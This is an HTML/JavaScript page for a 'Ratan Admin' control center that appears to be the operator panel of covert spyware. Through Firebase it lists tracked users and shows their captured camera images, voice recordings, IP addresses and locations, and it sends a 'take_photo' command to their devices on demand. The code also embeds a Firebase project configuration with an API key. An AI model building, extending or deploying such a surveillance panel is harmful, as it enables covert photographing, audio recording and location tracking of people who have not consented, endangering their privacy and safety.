<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Admin | Control Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --pink: #ff4d94; --dark: #0f172a; --card: #1e293b; }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        body { background: var(--dark); color: white; display: flex; height: 100vh; overflow: hidden; }

        /* Sidebar - User List */
        .sidebar { width: 300px; background: #020617; border-right: 2px solid var(--pink); display: flex; flex-direction: column; }
        .side-header { padding: 20px; background: var(--pink); color: white; font-weight: bold; text-align: center; }
        .user-list { flex: 1; overflow-y: auto; padding: 10px; }
        .user-item { 
            background: var(--card); padding: 12px; border-radius: 10px; margin-bottom: 10px; 
            cursor: pointer; display: flex; align-items: center; gap: 10px; border: 1px solid transparent;
            transition: 0.3s;
        }
        .user-item:hover { border-color: var(--pink); }
        .user-item img { width: 40px; height: 40px; border-radius: 50%; border: 2px solid var(--pink); }
        .status-dot { width: 10px; height: 10px; border-radius: 50%; background: #22c55e; margin-left: auto; }

        /* Main Content - Info Display */
        .main-content { flex: 1; padding: 30px; overflow-y: auto; display: none; }
        .profile-header { display: flex; align-items: center; gap: 20px; margin-bottom: 30px; }
        .profile-header img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--pink); }
        
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .data-card { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid #334155; }
        .data-card h4 { color: var(--pink); margin-bottom: 15px; border-bottom: 1px solid #334155; padding-bottom: 5px; }
        
        .pic-box { width: 100%; border-radius: 15px; border: 2px solid #334155; }
        
        .audio-list { list-style: none; }
        .audio-item { 
            background: #0f172a; padding: 10px; border-radius: 10px; margin-bottom: 8px;
            display: flex; align-items: center; justify-content: space-between;
        }
        .audio-btn { background: var(--pink); border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; }
        .del-btn { background: #ef4444; border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; }

        #login-screen { position: fixed; inset: 0; background: var(--dark); z-index: 100; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="login-screen">
        <button onclick="adminLogin()" style="background:var(--pink); color:white; border:none; padding:15px 40px; border-radius:50px; cursor:pointer; font-weight:bold; font-size:1.2rem;">
            Admin Login
        </button>
    </div>

    <div class="sidebar">
        <div class="side-header">Active Users</div>
        <div class="user-list" id="userList">
            </div>
    </div>

    <div class="main-content" id="detailsBox">
        <div class="profile-header">
            <img id="detPic" src="">
            <div>
                <h2 id="detName">Name</h2>
                <p id="detEmail" style="opacity: 0.7;"></p>
            </div>
            <button onclick="deleteUser()" class="del-btn" style="margin-left: auto;">Delete User Data</button>
        </div>

        <div class="info-grid">
            <div class="data-card">
                <h4><i class="fas fa-image"></i> Captured Image</h4>
                <img id="detImg" src="" class="pic-box">
                <button onclick="sendSnapCmd()" class="audio-btn" style="width:100%; margin-top:10px;">Instant Capture</button>
            </div>

            <div class="data-card">
                <h4><i class="fas fa-microphone"></i> Voice Clips (Manual Play)</h4>
                <div id="audioCollection" class="audio-list">
                    </div>
            </div>

            <div class="data-card">
                <h4><i class="fas fa-info-circle"></i> System Info</h4>
                <p><b>IP:</b> <span id="detIp"></span></p>
                <p><b>Location:</b> <span id="detLoc"></span></p>
                <p><b>Last Update:</b> <span id="detTime"></span></p>
                <a id="mapLink" href="#" target="_blank" class="audio-btn" style="display:inline-block; margin-top:10px; text-decoration:none;">View on Map</a>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, onSnapshot, doc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let selectedUserId = null;

        window.adminLogin = () => signInWithPopup(auth, provider);

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('login-screen').style.display = 'none';
                loadUserSidebar();
            }
        });

        // ১. সাইডবারে ইউজার লিস্ট লোড করা
        function loadUserSidebar() {
            onSnapshot(collection(db, "users"), (snap) => {
                const list = document.getElementById('userList');
                list.innerHTML = '';
                snap.forEach(d => {
                    const u = d.data();
                    const item = document.createElement('div');
                    item.className = 'user-item';
                    item.onclick = () => showUserDetails(d.id, u);
                    item.innerHTML = `
                        <img src="${u.photo}">
                        <div>
                            <b>${u.name}</b><br>
                            <small style="font-size:10px; opacity:0.6">${u.email}</small>
                        </div>
                        <div class="status-dot"></div>
                    `;
                    list.appendChild(item);
                });
            });
        }

        // ২. ইউজারের ডিটেইলস দেখানো
        function showUserDetails(id, u) {
            selectedUserId = id;
            document.getElementById('detailsBox').style.display = 'block';
            document.getElementById('detName').innerText = u.name;
            document.getElementById('detEmail').innerText = u.email;
            document.getElementById('detPic').src = u.photo;
            document.getElementById('detImg').src = u.lastPic;
            document.getElementById('detIp').innerText = u.ip;
            document.getElementById('detLoc').innerText = u.loc;
            document.getElementById('detTime').innerText = u.time;
            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${u.loc}`;

            // অডিও লিস্ট তৈরি (ম্যানুয়াল প্লে)
            const audioBox = document.getElementById('audioCollection');
            audioBox.innerHTML = '';
            if(u.lastAudio) {
                const div = document.createElement('div');
                div.className = 'audio-item';
                div.innerHTML = `
                    <span>Voice Clip - ${u.time.split(',')[1]}</span>
                    <div>
                        <button class="audio-btn" onclick="playAudio('${u.lastAudio}')">Play</button>
                    </div>
                `;
                audioBox.appendChild(div);
            }
        }

        window.playAudio = (src) => {
            const a = new Audio(src);
            a.play();
        };

        window.sendSnapCmd = async () => {
            if(!selectedUserId) return;
            await updateDoc(doc(db, "users", selectedUserId), { command: "take_photo" });
            alert("কমান্ড পাঠানো হয়েছে!");
        };

        window.deleteUser = async () => {
            if(!selectedUserId) return;
            if(confirm("সব ডাটা ডিলিট করতে চান?")) {
                await deleteDoc(doc(db, "users", selectedUserId));
                document.getElementById('detailsBox').style.display = 'none';
            }
        };
    </script>
</body>
</html>
